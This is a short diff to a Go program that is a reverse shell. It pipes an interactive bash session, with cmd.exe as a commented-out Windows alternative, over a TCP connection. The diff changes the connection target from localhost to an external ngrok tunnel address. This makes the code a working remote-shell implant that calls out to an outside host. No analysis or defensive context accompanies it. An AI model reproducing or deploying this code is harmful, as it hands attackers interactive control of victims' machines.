@@ -10,6 +10,7 @@ import (
 
 func handle(conn net.Conn) {
 	cmd := exec.Command("/bin/bash", "-i")
+	//cmd := exec.Command("cmd.exe")
 	rp, wp := io.Pipe()
 	cmd.Stdin = conn
 	cmd.Stdout = wp
@@ -19,7 +20,7 @@ func handle(conn net.Conn) {
 }
 
 func main() {
-	conn, err := net.Dial("tcp", "127.0.0.1:81")
+	conn, err := net.Dial("tcp", "4.tcp.ngrok.io:17209")
 	if err != nil {
 		log.Fatalln(err)
 	}
